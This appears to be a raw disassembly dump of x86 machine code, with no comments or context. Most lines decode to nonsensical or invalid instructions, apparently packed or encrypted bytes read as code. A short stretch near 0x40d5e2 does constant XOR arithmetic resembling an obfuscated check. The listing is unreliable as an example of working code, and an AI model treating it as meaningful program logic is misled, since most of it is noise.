  40d3ec:	mov    ebx,0x4a05d726
  40d3f1:	icebp  
  40d3f2:	imul   edi,edx,0xffffffe7
  40d3f5:	mov    al,ds:0x48fd180d
  40d3fa:	stos   DWORD PTR es:[edi],eax
  40d3fb:	rcr    al,1
  40d3fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3fe:	inc    ebp
  40d3ff:	mov    bl,0xff
  40d401:	ins    DWORD PTR es:[edi],dx
  40d402:	cli    
  40d403:	inc    edi
  40d404:	or     dl,BYTE PTR [edx-0x3e]
  40d407:	shl    DWORD PTR [ecx],cl
  40d409:	xchg   DWORD PTR [esi-0x12],edx
  40d40c:	call   0x4e35f71f
  40d411:	mov    ch,0x23
  40d413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d414:	xlat   BYTE PTR ds:[ebx]
  40d415:	mov    edx,0xf2295b2c
  40d41a:	clc    
  40d41b:	test   al,0x9d
  40d41d:	xchg   esi,eax
  40d41e:	and    al,0xf
  40d420:	push   0xb715a134
  40d425:	lods   al,BYTE PTR ds:[esi]
  40d426:	in     al,0x78
  40d428:	sbb    BYTE PTR [edi-0x792df1b],dl
  40d42e:	push   0x5a
  40d430:	out    dx,eax
  40d431:	and    al,dh
  40d433:	es hlt 
  40d435:	xchg   esi,eax
  40d436:	je     0x40d425
  40d438:	push   esp
  40d439:	mov    al,ds:0x7c3d15e3
  40d43e:	das    
  40d43f:	and    DWORD PTR [edx],ebp
  40d441:	mov    WORD PTR [edi+0x47],ss
  40d444:	dec    esi
  40d445:	mov    ah,0x5
  40d447:	cdq    
  40d448:	xchg   ecx,eax
  40d449:	xchg   BYTE PTR [ebp-0x43],bh
  40d44c:	pushw  ss
  40d44e:	lea    esp,[ebx+0x26e89bec]
  40d454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d455:	pop    es
  40d456:	pop    ebp
  40d457:	or     al,0xf2
  40d459:	arpl   WORD PTR [edi+esi*2],bp
  40d45c:	jge    0x40d48d
  40d45e:	sbb    DWORD PTR [edi+0x7f],edi
  40d461:	imul   edx,DWORD PTR [ebx+0x1247ebb3],0x8ddcb34e
  40d46b:	test   DWORD PTR [edx+eax*2+0x154ddeae],esp
  40d472:	push   cs
  40d473:	js     0x40d42c
  40d475:	pop    es
  40d476:	inc    esp
  40d477:	pop    eax
  40d478:	push   ebp
  40d479:	sbb    BYTE PTR [eax],al
  40d47b:	into   
  40d47c:	(bad)  
  40d47e:	adc    eax,0x25877eaf
  40d483:	sub    al,0x30
  40d485:	and    BYTE PTR [eax-0x7cd304b1],bh
  40d48b:	test   eax,0x54fc7374
  40d490:	loopne 0x40d42c
  40d492:	sbb    ch,dh
  40d494:	xchg   esp,eax
  40d495:	mov    edx,0x95ba96e
  40d49a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d49b:	(bad)  
  40d49c:	push   ebp
  40d49d:	loop   0x40d42a
  40d49f:	rol    BYTE PTR [esi+edi*2-0x5c9f55c6],cl
  40d4a6:	int    0x62
  40d4a8:	cmp    eax,DWORD PTR ds:0xc014f896
  40d4ae:	ja     0x40d507
  40d4b0:	mov    al,0x25
  40d4b2:	sbb    DWORD PTR ds:0x922a8ffe,eax
  40d4b8:	mov    ah,0xc
  40d4ba:	mov    ds:0xfc539f38,eax
  40d4bf:	ret    
  40d4c0:	and    edi,DWORD PTR [esi+0x41fdfdda]
  40d4c6:	pop    ebp
  40d4c7:	or     DWORD PTR [eax],eax
  40d4c9:	call   0x8e728ad
  40d4ce:	das    
  40d4cf:	ror    BYTE PTR [eax+ebp*4],cl
  40d4d2:	fcom   QWORD PTR [edx-0x2d]
  40d4d5:	out    0x28,eax
  40d4d7:	and    al,0x9d
  40d4d9:	xor    DWORD PTR [esi+0x2d],ecx
  40d4dc:	popa   
  40d4dd:	shl    BYTE PTR [ecx-0x29],cl
  40d4e0:	cmp    eax,0x67d1171b
  40d4e5:	push   edi
  40d4e6:	stos   DWORD PTR es:[edi],eax
  40d4e7:	xchg   ebp,eax
  40d4e8:	sbb    DWORD PTR [eax+esi*8],esp
  40d4eb:	jmp    0x40d4e6
  40d4ed:	mov    DWORD PTR [ebp-0x74fafb7],edi
  40d4f3:	mov    ds:0x4ba1b524,eax
  40d4f8:	f2xm1  
  40d4fa:	xchg   ebx,eax
  40d4fb:	mov    esp,0x1e1789b8
  40d500:	and    eax,0x62ce0c4f
  40d505:	imul   eax,DWORD PTR [eax+0x37ce4d05],0xffffff94
  40d50c:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d50e:	fstp   DWORD PTR ds:0x352a6634
  40d514:	xchg   ebx,eax
  40d515:	stos   BYTE PTR es:[edi],al
  40d516:	jns    0x40d531
  40d518:	xlat   BYTE PTR ds:[ebx]
  40d519:	and    BYTE PTR [edi+0x5ae71751],bl
  40d51f:	push   0x42
  40d521:	adc    BYTE PTR [eax+0x4b],al
  40d524:	pusha  
  40d525:	xor    dh,BYTE PTR [ecx]
  40d527:	mov    ebp,0x1a892f7a
  40d52c:	adc    eax,0x2f0ecef7
  40d531:	jle    0x40d541
  40d533:	(bad)  
  40d535:	rol    DWORD PTR [ecx+0x7],cl
  40d538:	add    dl,BYTE PTR ds:0x17b8b6c7
  40d53e:	outs   dx,DWORD PTR ds:[esi]
  40d53f:	aam    0xe
  40d541:	mov    fs,WORD PTR [edi+0x75]
  40d544:	sahf   
  40d545:	mov    esp,0xf924c9d3
  40d54a:	jmp    0x1e2b:0x8a5ac42c
  40d551:	cmp    eax,0xd5a446fd
  40d556:	fist   DWORD PTR [edi]
  40d558:	(bad)  
  40d559:	xchg   ebx,eax
  40d55a:	sbb    eax,0xa979c2df
  40d55f:	mov    eax,ds:0x4888139c
  40d564:	inc    ebp
  40d565:	mov    ah,0x54
  40d567:	cmc    
  40d568:	stc    
  40d569:	jl     0x40d5ba
  40d56b:	jp     0x40d550
  40d56d:	jecxz  0x40d545
  40d56f:	pop    esp
  40d570:	jl     0x40d593
  40d572:	pop    edx
  40d573:	outs   dx,DWORD PTR ds:[esi]
  40d574:	pusha  
  40d575:	dec    ecx
  40d576:	jb     0x40d539
  40d578:	nop
  40d579:	clc    
  40d57a:	aam    0x32
  40d57c:	lock (bad) 
  40d57e:	jb     0x40d51a
  40d580:	out    0x98,eax
  40d582:	lea    ebp,[esi+ebp*1+0x14]
  40d586:	nop
  40d587:	fidivr WORD PTR [eax-0x3a3502ad]
  40d58d:	ins    DWORD PTR es:[edi],dx
  40d58e:	into   
  40d58f:	pushf  
  40d590:	push   cs
  40d591:	mov    ecx,0xf0e15d20
  40d596:	shr    DWORD PTR [eax-0x3ffea016],0x3a
  40d59d:	shr    DWORD PTR [ebx-0x466fbccc],1
  40d5a3:	sbb    BYTE PTR [ecx+0x6],cl
  40d5a6:	into   
  40d5a7:	push   cs
  40d5a8:	jo     0x40d5fa
  40d5aa:	das    
  40d5ab:	loopne 0x40d57c
  40d5ad:	fst    QWORD PTR [eax+0x5d8dd53d]
  40d5b3:	lods   al,BYTE PTR ds:[esi]
  40d5b4:	ja     0x40d5e7
  40d5b6:	shr    edx,0x6
  40d5b9:	cld    
  40d5ba:	mov    bh,0x56
  40d5bc:	pop    es
  40d5bd:	pop    esp
  40d5be:	or     ecx,DWORD PTR [eax+0x3bc5da8d]
  40d5c4:	repnz pop ebx
  40d5c6:	xchg   edx,eax
  40d5c7:	inc    esp
  40d5c8:	retf   0x31e0
  40d5cb:	mov    BYTE PTR ds:0xfb7eb3c1,0xf0
  40d5d2:	and    ebx,DWORD PTR [ebx+edx*8-0x7aa8e6bc]
  40d5d9:	jle    0x40d5f6
  40d5db:	jg     0x40d5f2
  40d5dd:	mov    ch,0xc
  40d5df:	imul   eax,DWORD PTR [edx]
  40d5e2:	mov    edx,DWORD PTR [ebp-0x4]
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d5c2
  40d62d:	out    0x87,al
  40d62f:	test   al,0x2b
  40d631:	nop
  40d632:	jle    0x40d6b2
  40d634:	jge    0x40d6b3
  40d636:	jle    0x40d6b6
  40d638:	or     BYTE PTR [edi-0x6157acf9],cl
  40d63e:	xor    al,0x55
  40d640:	or     bl,0x99
  40d643:	adc    DWORD PTR [ecx-0x5babddfc],0xb220022b
  40d64d:	fidiv  DWORD PTR [ebx]
  40d64f:	or     BYTE PTR [ebx+ebx*4+0xa],bl
  40d653:	or     eax,0xfa9f5345
  40d658:	mov    al,0xf1
  40d65a:	xor    dl,cl
  40d65c:	cmp    esi,DWORD PTR [esi-0x6c4ec6c8]
  40d662:	fwait
  40d663:	xlat   BYTE PTR ds:[ebx]
  40d664:	jb     0x40d691
  40d666:	inc    ebp
  40d667:	jl     0x40d67a
  40d669:	mov    DWORD PTR ds:0xfff0ad25,esp
  40d66f:	ds mov ch,0xe4
  40d672:	call   0x61bd25ea
  40d677:	mov    ds,WORD PTR [eax+0x42c73627]
  40d67d:	cs xor eax,0x36b817b4
  40d683:	sbb    BYTE PTR [edi],bh
  40d685:	xchg   edi,eax
  40d686:	mov    eax,ds:0xcd041040
  40d68b:	imul   al
  40d68d:	mov    bh,0xbc
  40d68f:	jb     0x40d67d
  40d691:	cwde   
  40d692:	int3   
  40d693:	mov    ds:0xe3408b8f,al
  40d698:	pop    ebx
  40d699:	and    DWORD PTR [edx+0x8fb6c95],edi
  40d69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6a0:	js     0x40d690
  40d6a2:	popa   
  40d6a3:	(bad)  
  40d6a4:	daa    
  40d6a5:	leave  
  40d6a6:	daa    
  40d6a7:	inc    edx
  40d6a8:	xlat   BYTE PTR ds:[ebx]
  40d6a9:	(bad)  cs:[esi-0x8]
  40d6ad:	mov    edx,0x7bfb933d
  40d6b2:	imul   ecx,ebp,0xffffffba
  40d6b5:	jge    0x40d70d
  40d6b7:	dec    esp
  40d6b8:	into   
  40d6b9:	leave  
  40d6ba:	xchg   edi,eax
  40d6bb:	or     eax,0xa41550a1
  40d6c0:	test   BYTE PTR [edi],0x3
  40d6c3:	mov    al,ds:0x5442e5c3
  40d6c8:	ins    BYTE PTR es:[edi],dx
  40d6c9:	adc    ah,BYTE PTR [edi+0x6fa3fcc4]
  40d6cf:	cld    
  40d6d0:	jnp    0x40d6b4
  40d6d2:	adc    DWORD PTR [ebx+0x58],ecx
  40d6d5:	retf   
  40d6d6:	rcl    BYTE PTR [edx],0x1a
  40d6d9:	pusha  
  40d6da:	aaa    
  40d6db:	stos   DWORD PTR es:[edi],eax
  40d6dc:	retf   0x5c52
  40d6df:	in     eax,dx
  40d6e0:	or     ch,al
  40d6e2:	and    DWORD PTR [esp],ecx
  40d6e5:	les    esp,FWORD PTR [ebx]
  40d6e7:	lock jl 0x40d725
  40d6ea:	dec    ebx
  40d6eb:	fdivr  DWORD PTR [edi-0x2ef68956]
  40d6f1:	mov    ds:0x8d2420d8,al
  40d6f6:	cmp    DWORD PTR [ecx+0x4d4bbf18],edi
  40d6fc:	mov    ds:0x6303fd01,al
  40d701:	dec    esp
  40d702:	or     eax,0xda3fe1a5
  40d707:	repnz (bad) [ebp+0x5a593b15]
  40d70e:	(bad)  
  40d70f:	and    al,0xac
  40d711:	out    dx,al
  40d712:	sbb    bh,bl
  40d714:	mov    cl,0xac
  40d716:	mov    WORD PTR [ecx+0x4e],?
  40d719:	dec    edi
  40d71a:	sbb    DWORD PTR [ebx],0x18
  40d71d:	push   0x49fab6ae
  40d722:	test   BYTE PTR [edi+0xa5da41d],ch
  40d728:	test   BYTE PTR [ebx+0x6fcadf8f],al
  40d72e:	lock mov ebx,DWORD PTR [ecx-0x41265354]
  40d735:	jne    0x40d795
  40d737:	lock jmp 0x421338f
  40d73d:	int3   
  40d73e:	inc    esp
  40d73f:	jns    0x40d787
  40d741:	imul   ecx,DWORD PTR [eax],0xfffffffa
  40d744:	xchg   ebx,eax
  40d745:	icebp  
  40d746:	enter  0xb951,0x7a
  40d74a:	fist   WORD PTR [ecx+0x6e0593b]
  40d750:	and    edi,DWORD PTR [esi+0x4f81f470]
  40d756:	push   esp
  40d757:	jg     0x40d757
  40d759:	fistp  WORD PTR [ecx]
  40d75b:	add    ebp,DWORD PTR ds:0xfed88134
  40d761:	lock nop DWORD PTR [edi-0x450827c6]
  40d769:	pop    ebp
  40d76a:	sbb    al,ah
  40d76c:	shl    bh,1
  40d76e:	xchg   esp,eax
  40d76f:	lds    esp,FWORD PTR [eax+0x7c9e6253]
  40d775:	dec    esi
  40d776:	(bad)  
  40d777:	enter  0x8f6e,0x25
  40d77b:	jge    0x40d71b
  40d77d:	add    ah,BYTE PTR [eiz*8-0x352912be]
  40d784:	jge    0x40d756
  40d786:	loopne 0x40d7b2
  40d788:	sbb    eax,0x5495b4f5
  40d78d:	dec    eax
  40d78e:	ss jp  0x40d7be
  40d791:	ficom  WORD PTR [edx]
  40d793:	aad    0xa9
  40d795:	jmp    0xe04e:0xfe3375be
  40d79c:	leave  
  40d79d:	adc    eax,DWORD PTR [edx]
  40d79f:	pushf  
  40d7a0:	cmp    DWORD PTR [eax],0xe9f26f72
  40d7a6:	push   ebp
  40d7a7:	pop    ecx
  40d7a8:	dec    ebx
  40d7a9:	mov    esp,DWORD PTR [edx-0x10]
  40d7ac:	inc    edi
  40d7ad:	and    ch,ah
  40d7af:	jg     0x40d78e
  40d7b1:	mov    dh,0x57
  40d7b3:	(bad)  
  40d7b4:	sbb    eax,0x3eaf4a6b
  40d7b9:	jnp    0x40d80f
  40d7bb:	loop   0x40d753
  40d7bd:	push   0xffffffb1
  40d7bf:	les    ecx,FWORD PTR [ebx]
  40d7c1:	daa    
  40d7c2:	js     0x40d839
  40d7c4:	add    BYTE PTR [edi],ch
  40d7c6:	sbb    eax,0xc6fa5b56
  40d7cb:	xor    ecx,DWORD PTR ds:0xe637da6e
  40d7d1:	popa   
  40d7d2:	ret    0xc20d
  40d7d5:	clc    
  40d7d6:	xchg   DWORD PTR [edx],edi
  40d7d8:	sbb    al,BYTE PTR [eax+0x45]
  40d7db:	push   edi
  40d7dc:	mov    ds:0x33c66b46,al
  40d7e1:	int3   
  40d7e2:	jmp    0xea26f763
  40d7e7:	lods   al,BYTE PTR ds:[esi]
  40d7e8:	idiv   DWORD PTR [ebp-0x5e432612]
  40d7ee:	sub    al,0xc0
  40d7f0:	aam    0x8a
  40d7f2:	out    dx,eax
  40d7f3:	sar    BYTE PTR [edx],0x78
  40d7f6:	sub    BYTE PTR ds:0x2e2186c4,ah
  40d7fc:	test   eax,0xfdc71581
  40d801:	dec    esp
  40d802:	sbb    eax,0x90075067
  40d807:	dec    ecx
  40d808:	pushf  
  40d809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d80a:	jbe    0x40d7cf
  40d80c:	dec    esp
  40d80d:	lea    esp,[ecx+eiz*8-0x40cd8ca5]
  40d814:	cs mov eax,0x9d4ea01a
  40d81a:	inc    esp
  40d81b:	inc    esp
  40d81c:	cmc    
  40d81d:	jp     0x40d7e3
  40d81f:	dec    edx
  40d820:	scas   eax,DWORD PTR es:[edi]
  40d821:	add    al,0xa0
  40d823:	daa    
  40d824:	and    DWORD PTR [edi+esi*1-0x195c1264],0x12
  40d82c:	mov    ah,0x5
  40d82e:	pop    ds
  40d82f:	(bad)  
  40d830:	std    
  40d831:	inc    ecx
  40d832:	repz rcl al,cl
  40d835:	or     al,0x1d
  40d837:	(bad)  
  40d839:	clc    
  40d83a:	pop    esp
  40d83b:	pop    ss
  40d83c:	mov    al,ds:0x8315adab
  40d841:	or     edi,DWORD PTR fs:[esi]
  40d844:	jae    0x40d8b2
  40d846:	aad    0x85
  40d848:	lods   al,BYTE PTR ds:[esi]
  40d849:	jge    0x40d850
  40d84b:	mov    ah,ch
  40d84d:	inc    DWORD PTR [ecx+ebx*1+0x61]
  40d851:	mov    cs,WORD PTR [edi-0x5]
  40d854:	pop    edx
  40d855:	mov    edi,fs
  40d857:	ret    0xb327
  40d85a:	fs leave 
  40d85c:	push   ebx
  40d85d:	inc    eax
  40d85e:	sub    BYTE PTR [ebp+0x4],0x44
  40d862:	repz fwait
  40d864:	pushf  
  40d865:	jle    0x40d82f
  40d867:	ret    
  40d868:	in     eax,dx
  40d869:	adc    eax,DWORD PTR [edi]
  40d86b:	and    DWORD PTR [ecx+0x71],edx
  40d86e:	mov    bh,0x13
  40d870:	frstor [esi+edi*8+0x31597a20]
  40d877:	mov    eax,0x53e5e672
  40d87c:	scas   al,BYTE PTR es:[edi]
  40d87d:	pusha  
  40d87e:	xor    BYTE PTR [ecx-0x44],dl
  40d881:	or     eax,esp
  40d883:	push   ss
  40d884:	jnp    0x40d8a8
  40d886:	es sahf 
  40d888:	push   ss
  40d889:	cmp    BYTE PTR [edi-0x3300922a],cl
  40d88f:	stos   BYTE PTR es:[edi],al
  40d890:	push   edi
  40d891:	ficom  WORD PTR [esi-0x73d50e7b]
  40d897:	ins    DWORD PTR es:[edi],dx
  40d898:	mov    ds:0xc5db0b13,eax
  40d89d:	and    eax,0x89f17e73
  40d8a2:	stos   DWORD PTR es:[edi],eax
  40d8a3:	repnz shl BYTE PTR ds:0x7fc17e5e,cl
  40d8aa:	sbb    BYTE PTR [edx+0x3f],ch
  40d8ad:	add    DWORD PTR [ecx],ebp
  40d8af:	ins    BYTE PTR es:[edi],dx
  40d8b0:	je     0x40d8fd
  40d8b2:	sar    ah,cl
  40d8b4:	out    dx,eax
  40d8b5:	mov    edi,0xcd97b32c
  40d8ba:	out    dx,al
  40d8bb:	nop
  40d8bc:	mov    edi,0xa45ac5c8
  40d8c1:	jae    0x40d93d
  40d8c3:	inc    edi
  40d8c4:	shl    DWORD PTR [ebp+0x2d73478],cl
  40d8ca:	jb     0x40d89e
  40d8cc:	iret   
  40d8cd:	ins    BYTE PTR es:[edi],dx
  40d8ce:	xlat   BYTE PTR ds:[ebx]
  40d8cf:	shr    al,cl
  40d8d1:	lahf   
  40d8d2:	dec    esi
  40d8d3:	push   ebx
  40d8d4:	push   eax
  40d8d5:	hlt    
  40d8d6:	in     al,dx
  40d8d7:	xor    ecx,0x494f8242
  40d8dd:	pop    ss
  40d8de:	mov    dl,0xee
  40d8e0:	lods   eax,DWORD PTR ds:[esi]
  40d8e1:	sub    al,0x6f
  40d8e3:	inc    ebp
  40d8e4:	or     DWORD PTR [edx],esp
  40d8e6:	mov    DWORD PTR [ecx],eax
  40d8e8:	sbb    ebp,DWORD PTR [edi+esi*8-0x5dc86c0f]
  40d8ef:	iret   
  40d8f0:	std    
  40d8f1:	sar    cl,1
  40d8f3:	dec    ebx
  40d8f4:	mov    dh,BYTE PTR ds:0x22567ce1
  40d8fa:	xchg   edx,eax
  40d8fb:	cmc    
  40d8fc:	gs pop eax
  40d8fe:	cdq    
  40d8ff:	or     DWORD PTR [ebx],edx
  40d901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d902:	(bad)  
  40d903:	cmp    al,0xc
  40d905:	pop    es
  40d906:	(bad)  
  40d907:	fist   WORD PTR [esi-0x68510593]
  40d90d:	mov    cl,0xe7
  40d90f:	jne    0x40d922
  40d911:	sub    al,0xb1
  40d913:	pop    DWORD PTR [edx+ecx*8+0x260a963d]
  40d91a:	sub    esp,DWORD PTR [ebp+0xa]
  40d91d:	push   edx
  40d91e:	xor    bl,dl
  40d920:	pop    esi
  40d921:	scas   al,BYTE PTR es:[edi]
  40d922:	mov    al,ds:0xa8db92cb
  40d927:	fisubr WORD PTR ds:0x91ffa89a
  40d92d:	xchg   BYTE PTR [ecx-0x7],bh
  40d930:	bound  ecx,QWORD PTR [ebp+esi*1+0x63]
  40d934:	sub    al,0x58
  40d936:	pop    esp
  40d937:	mov    edi,0x333e27dc
  40d93c:	ror    DWORD PTR [ebp+0x729b0284],1
  40d942:	xor    al,BYTE PTR [eax]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	cmp    BYTE PTR [ebx+0x34],dl
  40d958:	push   es
  40d959:	ss lahf 
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	div    DWORD PTR [edi+ebx*1]
  40d964:	mov    ah,0xa0
  40d966:	jo     0x40d938
  40d968:	rcr    ebx,0xab
  40d96b:	retf   
  40d96c:	(bad)  
  40d96d:	aam    0xd5
  40d96f:	(bad)  
  40d970:	imul   ecx,DWORD PTR [edi+edi*4-0x58ccd4ea],0xc218c073
  40d97b:	xchg   edi,eax
  40d97c:	(bad)  
  40d97d:	fs fwait
  40d97f:	mov    bh,0x8c
  40d981:	sahf   
  40d982:	fsubr  st,st(6)
  40d984:	inc    ebx
  40d985:	push   es
  40d986:	pop    es
  40d987:	call   0x5803:0x3bda6823
  40d98e:	dec    ebp
  40d98f:	pusha  
  40d990:	dec    eax
  40d991:	pop    ebp
  40d992:	cmp    eax,0x260c882f
  40d997:	mov    esp,0xbf94eb99
  40d99c:	inc    esi
  40d99d:	sbb    cl,al
  40d99f:	not    ah
  40d9a1:	ss hlt 
  40d9a3:	push   es
  40d9a4:	int    0xe1
  40d9a6:	adc    BYTE PTR [esi],dl
  40d9a8:	sub    DWORD PTR [ecx],esi
  40d9aa:	dec    ecx
  40d9ab:	push   edx
  40d9ac:	xchg   esp,eax
  40d9ad:	dec    edx
  40d9ae:	add    al,0xdf
  40d9b0:	mov    ebx,0xf3fa90a6
  40d9b5:	loope  0x40d962
  40d9b7:	xchg   ecx,eax
  40d9b8:	shl    dh,0x77
  40d9bb:	push   ecx
  40d9bc:	jmp    0x28160188
  40d9c1:	push   esi
  40d9c2:	std    
  40d9c3:	jg     0x40d995
  40d9c5:	and    BYTE PTR [ecx+0x15],0xe7
  40d9c9:	dec    eax
  40d9ca:	ins    DWORD PTR es:[edi],dx
  40d9cb:	shr    DWORD PTR [edi+0x15e433e5],0xca
  40d9d2:	mov    cl,0x5d
  40d9d4:	repz sti 
  40d9d6:	pusha  
  40d9d7:	mov    eax,0xfbb7175a
  40d9dc:	retf   
  40d9dd:	call   0x44101e46
  40d9e2:	mov    edi,0x42f1d640
  40d9e7:	jecxz  0x40d9db
  40d9e9:	sbb    eax,0x81ebba49
  40d9ee:	jl     0x40d9af
  40d9f0:	adc    bh,BYTE PTR [ebx+0x59475fc7]
  40d9f6:	push   ss
  40d9f7:	cdq    
  40d9f8:	cmp    eax,0xd1211da4
  40d9fd:	imul   DWORD PTR [edi]
  40d9ff:	sahf   
  40da00:	mov    ebp,0x369c29fd
  40da05:	mov    cl,0xd4
  40da07:	push   ss
  40da08:	jnp    0x40d99e
  40da0a:	add    eax,0x190732f9
  40da0f:	out    dx,al
  40da10:	dec    ebx
  40da11:	les    edi,FWORD PTR [esi+0x0]
  40da14:	hlt    
  40da15:	mul    DWORD PTR [eax-0x3b]
  40da18:	dec    edi
  40da19:	inc    eax
  40da1a:	mov    ecx,0x53827193
  40da1f:	xchg   edi,eax
  40da20:	imul   ecx,DWORD PTR [esp+eiz*8+0x6b5cdf8],0x30
  40da28:	addr16 sub ebp,ebp
  40da2b:	mov    bl,0xd
  40da2d:	or     DWORD PTR [edx+0xdc9c8da],ecx
  40da33:	in     al,0x49
  40da35:	xor    DWORD PTR [ecx+0x651dd77e],esi
  40da3b:	pop    ecx
  40da3c:	push   edx
  40da3d:	fcmovnb st,st(4)
  40da3f:	sub    DWORD PTR [ecx],edi
  40da41:	cmp    cl,BYTE PTR [esi+eiz*4-0x3f427909]
  40da48:	dec    ecx
  40da49:	imul   edx,esp,0x51
  40da4c:	test   edi,0x472090d5
  40da52:	repz cmp dl,dh
  40da55:	retf   
  40da56:	or     BYTE PTR [ebp-0x3c],0xee
  40da5a:	jnp    0x40dac2
  40da5c:	test   eax,0x5fcfb4ba
  40da61:	dec    ebp
  40da62:	or     DWORD PTR [ebx-0x7c],ebx
  40da65:	and    al,0xf8
  40da67:	xchg   esi,eax
  40da68:	ret    0x826
  40da6b:	xor    ch,bl
  40da6d:	into   
  40da6e:	loopne 0x40dadf
  40da70:	enter  0xaed,0x2d
  40da74:	mov    DWORD PTR [edx+eiz*8],ebx
  40da77:	(bad)  
  40da78:	test   al,0x4e
  40da7a:	(bad)  
  40da7b:	add    DWORD PTR [eax-0x2988e64c],ebx
  40da81:	test   BYTE PTR [esi],dh
  40da83:	ds add eax,0x8ebb172a
  40da89:	add    eax,0x2a00df22
  40da8e:	mov    ebp,0x70035926
  40da93:	push   ebp
  40da94:	arpl   WORD PTR [edx+0x52],si
  40da97:	repz aaa 
  40da99:	dec    edi
  40da9a:	adc    edi,DWORD PTR ss:[edi+edx*1+0x78]
  40da9f:	adc    eax,0xb60b4c4d
  40daa4:	or     al,0x91
  40daa6:	std    
  40daa7:	inc    ebp
  40daa8:	mov    dh,dl
  40daaa:	les    esp,FWORD PTR [edi]
  40daac:	xchg   esp,eax
  40daad:	pop    ss
  40daae:	lock jns 0x40da58
  40dab1:	in     al,0x8c
  40dab3:	push   ebx
  40dab4:	test   eax,0xcee7c244
  40dab9:	and    ch,cl
  40dabb:	fcomp  DWORD PTR fs:[eax+ebx*2]
  40dabf:	(bad)  
  40dac0:	jne    0x40db16
  40dac2:	mov    ecx,DWORD PTR [ebp+0x74]
  40dac5:	mov    esp,0x77a2773c
  40daca:	push   0x7d
  40dacc:	jmp    0x6e04:0xdef4bedf
  40dad3:	jnp    0x40da9d
  40dad5:	cmp    al,0xea
  40dad7:	sub    eax,0xf17a68aa
  40dadc:	and    BYTE PTR [ebx-0x4e6819b0],dl
  40dae2:	lds    ebp,FWORD PTR [edi+eax*8]
  40dae5:	mov    dh,0xcf
  40dae7:	inc    edi
  40dae8:	adc    al,0x9b
  40daea:	retf   
  40daeb:	test   eax,0xf9da597b
  40daf0:	pushf  
  40daf1:	push   esi
  40daf2:	(bad)  
  40daf3:	jmp    0x40dac8
  40daf5:	add    BYTE PTR [ebp-0x37],dl
  40daf8:	mov    esi,DWORD PTR [edx]
  40dafa:	mov    WORD PTR ds:0xa5cf30ea,?
  40db00:	retf   0x67ae
  40db03:	lds    eax,FWORD PTR [edx]
  40db05:	outs   dx,BYTE PTR ds:[esi]
  40db06:	dec    edi
  40db07:	mov    al,0xcf
  40db09:	leave  
  40db0a:	les    edx,FWORD PTR [edi]
  40db0c:	call   0x3e89:0x5dd8e4b8
  40db13:	jle    0x40dac9
  40db15:	and    al,0x20
  40db17:	bound  ebp,QWORD PTR [ebp-0xe]
  40db1a:	es pop ecx
  40db1c:	mov    ch,dl
  40db1e:	sbb    eax,edx
  40db20:	popf   
  40db21:	pop    ds
  40db22:	add    eax,0xabb3c80e
  40db27:	test   DWORD PTR [eax-0x29],edx
  40db2a:	xchg   edx,eax
  40db2b:	rol    BYTE PTR [esi],cl
  40db2d:	call   0xd6286e01
  40db32:	enter  0xc06,0x5d
  40db36:	push   ss
  40db37:	inc    esp
  40db38:	lock je 0x40db32
  40db3b:	push   0x16
  40db3d:	jo     0x40db0a
  40db3f:	(bad)  
  40db40:	loop   0x40db30
  40db42:	mov    eax,ds:0x84d47728
  40db47:	and    bh,BYTE PTR [ebp-0x72]
  40db4a:	inc    ebp
  40db4b:	push   esi
  40db4c:	push   ecx
  40db4d:	push   esp
  40db4e:	and    BYTE PTR fs:[esp],al
  40db52:	jno    0x40dbaa
  40db54:	shr    DWORD PTR [esi-0x1bdf0622],cl
  40db5a:	retf   0x3817
  40db5d:	jp     0x40dbb2
  40db5f:	adc    bp,WORD PTR [esi+0x1f]
  40db63:	sub    DWORD PTR [ebp+0x2f],edi
  40db66:	les    ecx,FWORD PTR [edi+edi*2+0x25]
  40db6a:	int3   
  40db6b:	test   al,0xea
  40db6d:	jle    0x40db3d
  40db6f:	cmc    
  40db70:	jne    0x40dbdc
  40db72:	pop    eax
  40db73:	cmp    edx,DWORD PTR [esi-0xab5ee2d]
  40db79:	cvtps2pd xmm7,xmm0
  40db7c:	pop    ds
  40db7d:	repz mov bl,0x7b
  40db80:	pop    edi
  40db81:	cdq    
  40db82:	mov    DWORD PTR [edx-0x441c1fff],ebx
  40db88:	mov    ds:0x6e511920,al
  40db8d:	pop    eax
  40db8e:	and    al,0xc1
  40db90:	mov    ah,0x58
  40db92:	outs   dx,DWORD PTR ds:[esi]
  40db93:	adc    esp,edx
  40db95:	test   al,0xb1
  40db97:	jnp    0x40db58
  40db99:	neg    dl
  40db9b:	jne    0x40db91
  40db9d:	push   edi
  40db9e:	push   cs
  40db9f:	sbb    eax,0x6cd1aa73
  40dba4:	mov    edx,0x659cf219
  40dba9:	mov    edi,0xe7b7265e
  40dbae:	rcr    BYTE PTR [ebx+ebx*4-0x4644d2b2],0x16
